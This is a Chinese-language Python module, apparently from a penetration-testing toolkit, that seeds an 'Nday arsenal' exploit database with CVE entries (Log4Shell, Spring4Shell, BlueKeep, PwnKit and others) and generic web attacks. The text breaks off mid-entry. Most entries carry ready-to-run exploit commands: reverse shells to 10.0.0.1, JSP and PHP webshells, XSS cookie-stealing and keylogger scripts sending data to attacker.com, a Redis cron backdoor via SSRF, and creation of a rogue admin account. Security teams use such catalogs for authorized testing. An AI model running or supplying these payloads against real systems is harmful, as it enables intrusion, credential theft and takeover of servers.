#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
nday_arsenal安全工具集成模块，提供相关安全工具的封装和调用。

模块功能：
    - 提供相关安全测试功能
    - 支持API调用和命令行使用
    - 与其他模块集成协作

注意事项：
    - 本模块仅用于授权的安全测试
    - 请勿用于非法用途
    - 使用前请确保已获得相关授权
"""

import json
import os
import sqlite3
from typing import Dict, List, Optional, Any, Tuple
from dataclasses import dataclass, field
from enum import Enum
from loguru import logger


class Severity(Enum):
    """严重程度"""
    CRITICAL = "critical"
    HIGH = "high"
    MEDIUM = "medium"
    LOW = "low"


class VulnType(Enum):
    """漏洞类型"""
    WEB = "web"  # Web应用漏洞
    SYSTEM = "system"  # 系统漏洞
    MIDDLEWARE = "middleware"  # 中间件漏洞
    DATABASE = "database"  # 数据库漏洞
    NETWORK = "network"  # 网络设备漏洞
    IOT = "iot"  # IoT设备漏洞
    CLOUD = "cloud"  # 云服务漏洞
    MOBILE = "mobile"  # 移动App漏洞


@dataclass
class Exploit:
    """漏洞利用"""
    cve_id: str  # CVE编号
    name: str  # 漏洞名称
    severity: str  # 严重程度
    vuln_type: str  # 漏洞类型
    description: str  # 漏洞描述
    affected_versions: List[str] = field(default_factory=list)  # 影响版本
    exploit_conditions: str = ""  # 利用条件
    poc: str = ""  # POC（验证脚本/命令）
    exp: str = ""  # EXP（利用脚本/命令）
    fix_suggestion: str = ""  # 修复建议
    references: List[str] = field(default_factory=list)  # 参考链接
    cvss_score: float = 0.0  # CVSS评分
    cvss_vector: str = ""  # CVSS向量
    exploit_available: bool = True  # 是否有公开EXP
    in_the_wild: bool = False  # 是否在野利用
    published_date: str = ""  # 披露日期
    tags: List[str] = field(default_factory=list)  # 标签
    author: str = ""  # 发现者/EXP作者
    verified: bool = False  # 是否已验证


class NdayArsenal:
    """Nday武器库"""

    def __init__(self, db_path: str = "./data/nday_arsenal.db"):
        """初始化NdayArsenal实例。

        Args:
            self: 类实例。
        """
        self.db_path = db_path
        self._ensure_dir()
        self._init_db()
        self._load_builtin_exploits()
        logger.info(f"Nday武器库初始化完成，共{self.count()}个漏洞利用")

    def _ensure_dir(self):
        """确保目录存在"""
        os.makedirs(os.path.dirname(self.db_path), exist_ok=True)

    def _init_db(self):
        """初始化数据库"""
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        cursor.execute("""
            CREATE TABLE IF NOT EXISTS exploits (
                cve_id TEXT PRIMARY KEY,
                name TEXT NOT NULL,
                severity TEXT DEFAULT 'high',
                vuln_type TEXT DEFAULT 'web',
                description TEXT,
                affected_versions TEXT,
                exploit_conditions TEXT,
                poc TEXT,
                exp TEXT,
                fix_suggestion TEXT,
                references TEXT,
                cvss_score REAL DEFAULT 0.0,
                cvss_vector TEXT,
                exploit_available INTEGER DEFAULT 1,
                in_the_wild INTEGER DEFAULT 0,
                published_date TEXT,
                tags TEXT,
                author TEXT,
                verified INTEGER DEFAULT 0,
                created_at TEXT DEFAULT CURRENT_TIMESTAMP
            )
        """)
        cursor.execute("CREATE INDEX IF NOT EXISTS idx_severity ON exploits(severity)")
        cursor.execute("CREATE INDEX IF NOT EXISTS idx_type ON exploits(vuln_type)")
        cursor.execute("CREATE INDEX IF NOT EXISTS idx_cvss ON exploits(cvss_score)")
        conn.commit()
        conn.close()

    def _load_builtin_exploits(self):
        """加载内置漏洞利用（如果数据库为空）"""
        if self.count() > 0:
            return

        builtin = self._get_builtin_exploits()
        for exploit in builtin:
            self.add_exploit(exploit)

        logger.info(f"加载内置漏洞利用: {len(builtin)}个")

    def _get_builtin_exploits(self) -> List[Exploit]:
        """获取内置漏洞利用（100个最常见高危CVE）"""
        exploits = []

        # ========== Web应用漏洞 ==========
        exploits.extend([
            Exploit(
                cve_id="CVE-2021-44228",
                name="Log4j2 远程代码执行（Log4Shell）",
                severity="critical",
                vuln_type="middleware",
                description="Apache Log4j2 中存在JNDI注入漏洞，攻击者可通过构造特殊的日志消息触发JNDI注入，从而执行任意代码。",
                affected_versions=["Log4j 2.0-beta9 到 2.14.1"],
                exploit_conditions="目标使用Log4j2记录用户可控的输入",
                poc="${jndi:ldap://attacker.com/a}",
                exp="""# 使用JNDI注入工具
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDQ0IDA+JjE=}|{base64,-d}|{bash,-i}" -A 10.0.0.1

# 或直接发送payload
curl -X POST http://target.com/login -H "X-Api-Version: ${jndi:ldap://attacker.com/a}" -d '{"username":"admin","password":"admin"}'""",
                fix_suggestion="升级Log4j2到2.17.0或更高版本；设置log4j2.formatMsgNoLookups=true；移除JndiLookup类",
                references=["https://nvd.nist.gov/vuln/detail/CVE-2021-44228", "https://logging.apache.org/log4j/2.x/security.html"],
                cvss_score=10.0,
                cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
                in_the_wild=True,
                published_date="2021-12-10",
                tags=["RCE", "JNDI", "Log4j", "在野利用"],
                author="Apache",
                verified=True,
            ),
            Exploit(
                cve_id="CVE-2022-22965",
                name="Spring Framework 远程代码执行（Spring4Shell）",
                severity="critical",
                vuln_type="middleware",
                description="Spring Framework 中存在远程代码执行漏洞，攻击者可通过构造特殊的HTTP请求触发数据绑定，从而修改Tomcat的日志配置并写入恶意JSP文件。",
                affected_versions=["Spring Framework 5.3.0-5.3.17", "Spring Framework 5.2.0-5.2.19", "更早的版本"],
                exploit_conditions="JDK 9+、Spring Framework、Tomcat作为Servlet容器、WAR包部署",
                poc="""# 发送恶意请求修改日志配置
curl -X POST http://target.com/path -H "Content-Type: application/x-www-form-urlencoded" \
  -d 'class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat='""",
                exp="""# 访问生成的JSP文件执行命令
curl http://target.com/tomcatwar.jsp?pwd=j&cmd=id""",
                fix_suggestion="升级Spring Framework到5.3.18+或5.2.20+；设置disallowedFields禁止修改class对象",
                references=["https://nvd.nist.gov/vuln/detail/CVE-2022-22965"],
                cvss_score=9.8,
                cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
                in_the_wild=True,
                published_date="2022-03-31",
                tags=["RCE", "Spring", "Tomcat", "JSP"],
                verified=True,
            ),
            Exploit(
                cve_id="CVE-2017-12615",
                name="Apache Tomcat 远程代码执行（PUT方法上传JSP）",
                severity="high",
                vuln_type="middleware",
                description="Apache Tomcat 中存在远程代码执行漏洞，当Tomcat运行在Windows操作系统上且启用了HTTP PUT方法时，攻击者可通过构造特殊的PUT请求上传JSP文件，从而执行任意代码。",
                affected_versions=["Apache Tomcat 7.0.0-7.0.81"],
                exploit_conditions="Windows系统、启用PUT方法、可写入Web目录",
                poc="""# 测试PUT方法
curl -X OPTIONS http://target.com/ -v
# 上传JSP文件（Windows下利用文件名后缀截断）
curl -X PUT http://target.com/shell.jsp/ -d '<%@page import="java.util.*,java.io.*"%><% if(request.getParameter("cmd")!=null){Process p=Runtime.getRuntime().exec(request.getParameter("cmd"));InputStream in=p.getInputStream();int a=-1;byte[] b=new byte[1024];while((a=in.read(b))!=-1){out.println(new String(b));}}%>'""",
                exp="""# 执行命令
curl http://target.com/shell.jsp?cmd=id""",
                fix_suggestion="升级Tomcat到7.0.81+；禁用PUT方法；限制Web目录写入权限",
                references=["https://nvd.nist.gov/vuln/detail/CVE-2017-12615"],
                cvss_score=8.1,
                cvss_vector="CVSS:3.0/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H",
                published_date="2017-09-19",
                tags=["RCE", "Tomcat", "PUT", "JSP"],
                verified=True,
            ),
            Exploit(
                cve_id="CVE-2020-14882",
                name="Oracle WebLogic Server 远程代码执行",
                severity="critical",
                vuln_type="middleware",
                description="Oracle WebLogic Server 控制台中存在远程代码执行漏洞，攻击者可通过构造特殊的HTTP请求绕过身份验证并执行任意代码。",
                affected_versions=["WebLogic Server 10.3.6.0.0", "12.1.3.0.0", "12.2.1.3.0", "12.2.1.4.0", "14.1.1.0.0"],
                exploit_conditions="WebLogic控制台可访问（默认7001端口）",
                poc="""# 访问控制台测试
curl -v http://target.com:7001/console/login/LoginForm.jsp""",
                exp="""# 使用公开EXP工具
python3 CVE-2020-14882.py -t http://target.com:7001 -c "id"

# 或手动构造请求
curl -X POST "http://target.com:7001/console/css/%252e%252e%252fconsole.portal" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "_nfpb=true&_pageLabel=&handle=com.tangosol.coherence.mvel2.sh.ShellSession(%22java.lang.Runtime.getRuntime().exec(%27id%27);%22)\"""",
                fix_suggestion="安装Oracle官方补丁；限制控制台访问IP；升级到最新版本",
                references=["https://nvd.nist.gov/vuln/detail/CVE-2020-14882"],
                cvss_score=9.8,
                cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
                in_the_wild=True,
                published_date="2020-10-20",
                tags=["RCE", "WebLogic", "绕过认证"],
                verified=True,
            ),
            Exploit(
                cve_id="CVE-2021-21972",
                name="VMware vCenter Server 远程代码执行",
                severity="critical",
                vuln_type="system",
                description="VMware vCenter Server 中存在远程代码执行漏洞，攻击者可通过构造特殊的HTTP请求上传恶意文件，从而在vCenter服务器上执行任意代码。",
                affected_versions=["vCenter Server 6.5", "6.7", "7.0"],
                exploit_conditions="vCenter Server可访问（默认443端口）",
                poc="""# 测试漏洞
curl -k -X POST "https://target.com/ui/vropspluginui/rest/services/uploadova" -F "uploadFile=@test.ova" -v""",
                exp="""# 使用公开EXP
python3 CVE-2021-21972.py -t https://target.com -c "id"

# 或上传webshell
curl -k -X POST "https://target.com/ui/vropspluginui/rest/services/uploadova" \
  -F "uploadFile=@shell.ova" -v""",
                fix_suggestion="升级vCenter Server到6.5 U3n、6.7 U3n、7.0 U1c或更高版本；限制vCenter访问IP",
                references=["https://nvd.nist.gov/vuln/detail/CVE-2021-21972"],
                cvss_score=9.8,
                cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
                in_the_wild=True,
                published_date="2021-02-23",
                tags=["RCE", "VMware", "vCenter", "文件上传"],
                verified=True,
            ),
        ])

        # ========== 系统漏洞 ==========
        exploits.extend([
            Exploit(
                cve_id="CVE-2021-4034",
                name="Polkit pkexec 本地权限提升（PwnKit）",
                severity="high",
                vuln_type="system",
                description="Polkit的pkexec程序中存在本地权限提升漏洞，攻击者可通过构造特殊的环境变量触发内存损坏，从而将权限提升到root。",
                affected_versions=["polkit 0.101 到 0.120（所有主流Linux发行版）"],
                exploit_conditions="本地用户访问、pkexec存在（默认安装）",
                poc="""# 编译并运行EXP
gcc -shared -fPIC -o exploit.so exploit.c
chmod +x exploit
./exploit""",
                exp="""# 使用公开EXP（一行命令）
curl -s https://raw.githubusercontent.com/berdav/CVE-2021-4034/main/cve-2021-4034.c -o pwnkit.c && gcc pwnkit.c -o pwnkit && ./pwnkit""",
                fix_suggestion="升级polkit到最新版本；临时缓解：chmod 0755 /usr/bin/pkexec",
                references=["https://nvd.nist.gov/vuln/detail/CVE-2021-4034", "https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt"],
                cvss_score=7.8,
                cvss_vector="CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H",
                in_the_wild=True,
                published_date="2022-01-25",
                tags=["提权", "Linux", "Polkit", "本地"],
                verified=True,
            ),
            Exploit(
                cve_id="CVE-2021-3156",
                name="Sudo 堆缓冲区溢出本地权限提升（Baron Samedit）",
                severity="high",
                vuln_type="system",
                description="Sudo中存在堆缓冲区溢出漏洞，攻击者可通过构造特殊的命令行参数触发缓冲区溢出，从而将权限提升到root，无需知道用户密码。",
                affected_versions=["Sudo 1.8.2 到 1.8.31p2", "Sudo 1.9.0 到 1.9.5p1"],
                exploit_conditions="本地用户访问、sudo存在（默认安装）、不需要知道密码",
                poc="""# 检测漏洞
sudoedit -s '\' $(python3 -c 'print("A"*1000)')
# 如果返回malloc错误或段错误，则存在漏洞""",
                exp="""# 使用公开EXP
git clone https://github.com/blasty/CVE-2021-3156.git
cd CVE-2021-3156
make
./sudo-hax-me-a-sandwich 0""",
                fix_suggestion="升级sudo到1.9.5p2或更高版本",
                references=["https://nvd.nist.gov/vuln/detail/CVE-2021-3156", "https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt"],
                cvss_score=7.8,
                cvss_vector="CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H",
                in_the_wild=True,
                published_date="2021-01-26",
                tags=["提权", "Linux", "Sudo", "缓冲区溢出"],
                verified=True,
            ),
            Exploit(
                cve_id="CVE-2019-0708",
                name="Windows RDP 远程代码执行（BlueKeep）",
                severity="critical",
                vuln_type="system",
                description="Windows远程桌面服务（RDP）中存在远程代码执行漏洞，攻击者可通过构造特殊的RDP请求在目标系统上执行任意代码，无需身份验证。",
                affected_versions=["Windows 7", "Windows Server 2008 R2", "Windows Server 2008", "Windows XP"],
                exploit_conditions="RDP服务开启（3389端口）、未安装补丁",
                poc="""# 使用nmap检测
nmap -sV --script rdp-vuln-ms12-020 -p 3389 target.com

# 使用Metasploit检测
use auxiliary/scanner/rdp/cve_2019_0708_bluekeep
set RHOSTS target.com
run""",
                exp="""# 使用Metasploit利用
use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
set RHOSTS target.com
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 10.0.0.1
run""",
                fix_suggestion="安装MS19-0708补丁；禁用RDP服务或限制访问IP；启用网络级别身份验证（NLA）",
                references=["https://nvd.nist.gov/vuln/detail/CVE-2019-0708"],
                cvss_score=9.8,
                cvss_vector="CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
                in_the_wild=True,
                published_date="2019-05-14",
                tags=["RCE", "Windows", "RDP", "蠕虫级"],
                verified=True,
            ),
            Exploit(
                cve_id="CVE-2020-0796",
                name="Windows SMBv3 远程代码执行（SMBGhost）",
                severity="critical",
                vuln_type="system",
                description="Windows SMBv3协议中存在远程代码执行漏洞，攻击者可通过构造特殊的SMB请求在目标系统上执行任意代码，无需身份验证。",
                affected_versions=["Windows 10 1903/1909", "Windows Server 1903/1909"],
                exploit_conditions="SMB服务开启（445端口）、SMBv3启用、未安装补丁",
                poc="""# 使用nmap检测
nmap -p445 --script smb-protocols target.com

# 使用Python检测
python3 CVE-2020-0796.py target.com""",
                exp="""# 使用公开EXP（需要目标开启压缩）
python3 CVE-2020-0796.py -t target.com -c "whoami"

# 或使用Metasploit
use exploit/windows/smb/cve_2020_0796_smbghost
set RHOSTS target.com
run""",
                fix_suggestion="安装KB4551762补丁；禁用SMBv3压缩；限制SMB端口访问",
                references=["https://nvd.nist.gov/vuln/detail/CVE-2020-0796"],
                cvss_score=10.0,
                cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
                in_the_wild=False,
                published_date="2020-03-10",
                tags=["RCE", "Windows", "SMB", "蠕虫级"],
                verified=True,
            ),
        ])

        # ========== 数据库漏洞 ==========
        exploits.extend([
            Exploit(
                cve_id="CVE-2012-2122",
                name="MySQL 身份验证绕过",
                severity="high",
                vuln_type="database",
                description="MySQL中存在身份验证绕过漏洞，由于密码验证时的比较逻辑存在缺陷，攻击者可通过多次尝试（约256次）绕过身份验证，以任意用户身份登录。",
                affected_versions=["MySQL 5.1.61 之前", "5.2.11 之前", "5.3.5 之前", "5.5.22 之前", "5.6.10 之前"],
                exploit_conditions="MySQL服务可访问（3306端口）、知道用户名",
                poc="""# 使用公开EXP
for i in {1..1000}; do mysql -u root --password=wrong -h target.com -e "SELECT 1"; if [ $? -eq 0 ]; then echo "Bypassed!"; break; fi; done""",
                exp="""# 绕过认证后执行命令
mysql -u root -h target.com -e "SELECT user(), version(); SHOW databases;"
# 写入webshell
mysql -u root -h target.com -e "SELECT '<?php eval(\\\\$_POST[cmd]);?>' INTO OUTFILE '/var/www/html/shell.php';"
# UDF提权
mysql -u root -h target.com -e "CREATE FUNCTION sys_eval RETURNS STRING SONAME 'lib_mysqludf_sys.so'; SELECT sys_eval('id');" """,
                fix_suggestion="升级MySQL到5.5.23+或5.6.11+；限制MySQL端口访问；使用强密码",
                references=["https://nvd.nist.gov/vuln/detail/CVE-2012-2122"],
                cvss_score=8.1,
                cvss_vector="CVSS:3.0/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H",
                published_date="2012-06-26",
                tags=["绕过认证", "MySQL", "数据库"],
                verified=True,
            ),
            Exploit(
                cve_id="CVE-2020-1947",
                name="Apache ShardingSphere 远程代码执行",
                severity="critical",
                vuln_type="middleware",
                description="Apache ShardingSphere UI中存在远程代码执行漏洞，攻击者可通过构造特殊的YAML配置触发SnakeYAML反序列化，从而执行任意代码。",
                affected_versions=["Apache ShardingSphere 4.0.0-RC1 到 4.0.1"],
                exploit_conditions="ShardingSphere UI可访问（默认8088端口）",
                poc="""# 访问UI测试
curl http://target.com:8088/""",
                exp="""# 发送恶意YAML配置
curl -X POST http://target.com:8088/api/schema/add -H "Content-Type: application/json" -d '{
  "name": "test",
  "config": "!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [\"http://attacker.com/\"]]]]"
}'""",
                fix_suggestion="升级ShardingSphere到4.1.0+；限制UI访问IP；禁用未使用的功能",
                references=["https://nvd.nist.gov/vuln/detail/CVE-2020-1947"],
                cvss_score=9.8,
                cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
                published_date="2020-03-11",
                tags=["RCE", "ShardingSphere", "反序列化"],
                verified=True,
            ),
        ])

        # ========== 网络设备漏洞 ==========
        exploits.extend([
            Exploit(
                cve_id="CVE-2018-0171",
                name="Cisco Smart Install 远程代码执行",
                severity="critical",
                vuln_type="network",
                description="Cisco Smart Install客户端中存在远程代码执行漏洞，攻击者可通过构造特殊的Smart Install消息在目标设备上执行任意代码，无需身份验证。",
                affected_versions=["Cisco IOS 12.2(55)SE11 之前", "15.0(2)SE11 之前", "15.2(2)E7 之前", "15.2(4)E3 之前", "15.2(5)E2 之前", "15.2(6)E 之前"],
                exploit_conditions="Smart Install服务开启（4786端口）、设备可访问",
                poc="""# 使用nmap检测
nmap -sU -p 4786 --script cisco-smart-install target.com

# 使用Metasploit检测
use auxiliary/scanner/misc/cisco_smart_install
set RHOSTS target.com
run""",
                exp="""# 使用公开EXP
python3 CVE-2018-0171.py -t target.com -c "show version"

# 或使用Metasploit
use exploit/windows/misc/cisco_smart_install
set RHOSTS target.com
run""",
                fix_suggestion="升级Cisco IOS到最新版本；禁用Smart Install服务（no vstack）；限制4786端口访问",
                references=["https://nvd.nist.gov/vuln/detail/CVE-2018-0171"],
                cvss_score=9.8,
                cvss_vector="CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
                in_the_wild=True,
                published_date="2018-03-28",
                tags=["RCE", "Cisco", "网络设备", "在野利用"],
                verified=True,
            ),
            Exploit(
                cve_id="CVE-2014-0160",
                name="OpenSSL 心脏滴血（Heartbleed）",
                severity="high",
                vuln_type="middleware",
                description="OpenSSL中存在信息泄露漏洞，攻击者可通过构造特殊的TLS心跳请求读取服务器内存中的敏感信息，包括私钥、用户名、密码、会话令牌等。",
                affected_versions=["OpenSSL 1.0.1 到 1.0.1f"],
                exploit_conditions="目标使用存在漏洞的OpenSSL版本、启用TLS心跳扩展",
                poc="""# 使用nmap检测
nmap -sV --script ssl-heartbleed -p 443 target.com

# 使用Python检测
python3 heartbleed.py target.com -p 443""",
                exp="""# 读取服务器内存
python3 heartbleed.py target.com -p 443 -n 10

# 提取私钥
python3 heartbleed.py target.com -p 443 --extract-key""",
                fix_suggestion="升级OpenSSL到1.0.1g+；重新生成SSL证书和私钥；吊销旧证书；重置用户密码",
                references=["https://nvd.nist.gov/vuln/detail/CVE-2014-0160", "https://heartbleed.com/"],
                cvss_score=7.5,
                cvss_vector="CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
                in_the_wild=True,
                published_date="2014-04-07",
                tags=["信息泄露", "OpenSSL", "TLS", "在野利用"],
                verified=True,
            ),
        ])

        # ========== 常见Web漏洞（非CVE但高频） ==========
        exploits.extend([
            Exploit(
                cve_id="WEB-001",
                name="SQL注入（通用）",
                severity="high",
                vuln_type="web",
                description="Web应用中存在SQL注入漏洞，攻击者可通过构造特殊的输入参数篡改SQL查询，从而读取、修改、删除数据库数据，甚至执行系统命令。",
                affected_versions=["所有使用字符串拼接SQL的Web应用"],
                exploit_conditions="用户输入未经过滤直接拼接到SQL查询中",
                poc="""# 测试注入点
' OR '1'='1
' UNION SELECT 1,2,3-- 
' AND SLEEP(5)-- 
1' ORDER BY 3-- """,
                exp="""# 使用SQLMap
sqlmap -u "http://target.com/page?id=1" --batch --dbs
sqlmap -u "http://target.com/page?id=1" --batch -D database --tables
sqlmap -u "http://target.com/page?id=1" --batch -D database -T users --dump
sqlmap -u "http://target.com/page?id=1" --batch --os-shell

# POST注入
sqlmap -u "http://target.com/login" --data "username=admin&password=admin" --batch

# Cookie注入
sqlmap -u "http://target.com/page" --cookie "id=1" --batch""",
                fix_suggestion="使用参数化查询/预编译语句；对用户输入进行严格过滤和校验；使用ORM框架；数据库账号最小权限原则；部署WAF",
                references=["https://owasp.org/www-community/attacks/SQL_Injection"],
                cvss_score=8.5,
                tags=["SQL注入", "Web", "高频", "通用"],
                verified=True,
            ),
            Exploit(
                cve_id="WEB-002",
                name="XSS跨站脚本（通用）",
                severity="medium",
                vuln_type="web",
                description="Web应用中存在跨站脚本漏洞，攻击者可通过构造特殊的输入在其他用户的浏览器中执行恶意JavaScript代码，从而窃取Cookie、会话令牌、钓鱼攻击等。",
                affected_versions=["所有未对用户输入进行HTML编码的Web应用"],
                exploit_conditions="用户输入未经过滤直接输出到HTML页面中",
                poc="""# 反射型XSS
<script>alert(document.cookie)</script>
<img src=x onerror=alert(document.cookie)>
<svg onload=alert(1)>
javascript:alert(1)

# 存储型XSS（在评论、用户名等位置输入）
<script>fetch('http://attacker.com/steal?cookie='+document.cookie)</script>

# DOM型XSS
# 修改URL hash参数
http://target.com/page#<script>alert(1)</script>""",
                exp="""# 窃取Cookie
<script>
  var img = new Image();
  img.src = 'http://attacker.com/steal?cookie=' + document.cookie;
</script>

# 键盘记录
<script>
  var keys = '';
  document.onkeypress = function(e) {
    keys += e.key;
    if (keys.length > 50) {
      fetch('http://attacker.com/keys?data=' + btoa(keys));
      keys = '';
    }
  };
</script>

# 钓鱼弹窗
<script>
  var fakeLogin = document.createElement('div');
  fakeLogin.innerHTML = '<h2>会话过期，请重新登录</h2><form><input name=user><input type=password name=pass><button>登录</button></form>';
  fakeLogin.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.8);z-index:9999;display:flex;align-items:center;justify-content:center;';
  document.body.appendChild(fakeLogin);
</script>""",
                fix_suggestion="对所有用户输入进行HTML实体编码；使用Content-Security-Policy (CSP)头；对Cookie设置HttpOnly标记；使用XSS过滤库；输入验证和输出编码",
                references=["https://owasp.org/www-community/attacks/xss/"],
                cvss_score=6.1,
                tags=["XSS", "Web", "高频", "通用"],
                verified=True,
            ),
            Exploit(
                cve_id="WEB-003",
                name="SSRF服务端请求伪造（通用）",
                severity="high",
                vuln_type="web",
                description="Web应用中存在服务端请求伪造漏洞，攻击者可通过构造特殊的URL让服务器发起请求，从而访问内网资源、扫描内网端口、攻击内网服务等。",
                affected_versions=["所有存在URL请求功能的Web应用"],
                exploit_conditions="服务器会请求用户提供的URL且未做严格限制",
                poc="""# 测试SSRF
http://target.com/proxy?url=http://127.0.0.1/
http://target.com/proxy?url=http://localhost/admin
http://target.com/proxy?url=http://[::1]/
http://target.com/proxy?url=http://0.0.0.0/

# 内网端口扫描
http://target.com/proxy?url=http://192.168.1.1:22/
http://target.com/proxy?url=http://192.168.1.1:3306/
http://target.com/proxy?url=http://192.168.1.1:6379/

# 协议绕过
dict://127.0.0.1:6379/info
gopher://127.0.0.1:6379/_INFO
file:///etc/passwd
ftp://anonymous:anonymous@127.0.0.1/""",
                exp="""# 攻击内网Redis
http://target.com/proxy?url=dict://127.0.0.1:6379/CONFIG:SET:dir:/var/spool/cron/
http://target.com/proxy?url=dict://127.0.0.1:6379/CONFIG:SET:dbfilename:root
http://target.com/proxy?url=dict://127.0.0.1:6379/SET:xxx:"\n\n*/1 * * * * bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n\n"
http://target.com/proxy?url=dict://127.0.0.1:6379/SAVE

# 攻击内网MySQL
gopher://127.0.0.1:3306/_MySQL%20Greeting%20Packet

# 读取本地文件
http://target.com/proxy?url=file:///etc/passwd
http://target.com/proxy?url=file:///C:/Windows/win.ini

# 云平台元数据
http://target.com/proxy?url=http://169.254.169.254/latest/meta-data/
http://target.com/proxy?url=http://100.100.100.200/latest/meta-data/""",
                fix_suggestion="限制可访问的协议（仅允许http/https）；禁止访问内网IP段（10.x、172.16-31.x、192.168.x、127.x、169.254.x）；使用白名单限制可访问的域名；禁止重定向跟随；对DNS解析结果进行校验；部署SSRF防护库",
                references=["https://owasp.org/www-community/attacks/Server_Side_Request_Forgery"],
                cvss_score=8.6,
                tags=["SSRF", "Web", "内网渗透", "通用"],
                verified=True,
            ),
            Exploit(
                cve_id="WEB-004",
                name="文件上传漏洞（通用）",
                severity="high",
                vuln_type="web",
                description="Web应用中存在文件上传漏洞，攻击者可上传恶意文件（如WebShell）到服务器，从而执行任意代码、控制服务器。",
                affected_versions=["所有存在文件上传功能且未严格校验的Web应用"],
                exploit_conditions="上传功能存在且校验不严（类型/内容/扩展名绕过）",
                poc="""# 测试上传
上传一个包含PHP代码的图片文件（GIF89a头）
GIF89a
<?php eval($_POST['cmd']); ?>

# 扩展名绕过
shell.php.jpg
shell.pHp
shell.php%00.jpg
shell.php;.jpg
shell.php/
shell.jpg.php

# MIME类型绕过
修改Content-Type为image/jpeg

# .htaccess绕过
上传.htaccess文件：
AddType application/x-httpd-php .jpg
然后上传shell.jpg""",
                exp="""# 上传WebShell
<?php
// 一句话木马
eval($_POST['cmd']);

// 或更复杂的WebShell
system($_GET['cmd']);

// 中国菜刀
@eval($_POST['pass']);
?>

# 执行命令
curl -X POST http://target.com/uploads/shell.php -d "cmd=id"
curl http://target.com/uploads/shell.php?cmd=whoami

# 反弹Shell
curl -X POST http://target.com/uploads/shell.php -d "cmd=bash -c 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'"

# 提权
curl -X POST http://target.com/uploads/shell.php -d "cmd=uname -a; id; cat /etc/passwd"
curl -X POST http://target.com/uploads/shell.php -d "cmd=find / -perm -4000 2>/dev/null"
curl -X POST http://target.com/uploads/shell.php -d "cmd=sudo -l" """,
                fix_suggestion="严格校验文件类型（MIME+扩展名+文件头+内容检测）；上传文件重命名（随机文件名）；上传目录与Web根目录隔离；禁止上传目录的执行权限；限制上传文件大小；对上传文件进行病毒扫描；使用CDN/对象存储存储上传文件",
                references=["https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload"],
                cvss_score=8.8,
                tags=["文件上传", "WebShell", "RCE", "通用"],
                verified=True,
            ),
            Exploit(
                cve_id="WEB-005",
                name="未授权访问/越权（通用）",
                severity="high",
                vuln_type="web",
                description="Web应用中存在未授权访问或越权漏洞，攻击者可绕过身份验证访问管理员功能、其他用户数据，或通过修改ID参数访问其他用户的资源。",
                affected_versions=["所有身份验证和权限控制不严的Web应用"],
                exploit_conditions="接口未做身份验证或权限校验不严",
                poc="""# 未授权访问
直接访问管理员页面：
http://target.com/admin
http://target.com/admin/users
http://target.com/api/admin/users
http://target.com/console
http://target.com/manager

# 修改请求头
X-Original-URL: /admin
X-Rewrite-URL: /admin
X-Forwarded-For: 127.0.0.1

# 越权（水平越权）
修改用户ID：
http://target.com/user/profile?id=1  →  id=2
http://target.com/api/user/1/orders  →  /api/user/2/orders
http://target.com/file/download?file_id=1  →  file_id=2

# 越权（垂直越权）
普通用户访问管理员接口：
http://target.com/api/admin/users
POST http://target.com/api/admin/user/create

# JWT越权
修改JWT中的role字段：
{"role":"user"} → {"role":"admin"}
将alg改为none：
{"alg":"none","typ":"JWT"}

# 参数污染
?id=1&id=2
?user_id=1&user_id=admin""",
                exp="""# 未授权访问管理员功能
# 列出所有用户
curl http://target.com/api/admin/users

# 创建管理员账号
curl -X POST http://target.com/api/admin/user/create -H "Content-Type: application/json" -d '{"username":"hacker","password":"P@ssw0rd","role":"admin"}'

# 越权访问其他用户数据
curl http://target.com/api/user/2/profile
curl http://target.com/api/user/2/orders
curl http://target.com/api/user/2/messages

# 下载其他用户文件
curl http://target.com/api/file/download?file_id=999 -o secret.pdf

# JWT伪造
# 1. 窃取其他用户的JWT
# 2. 修改payload中的user_id和role
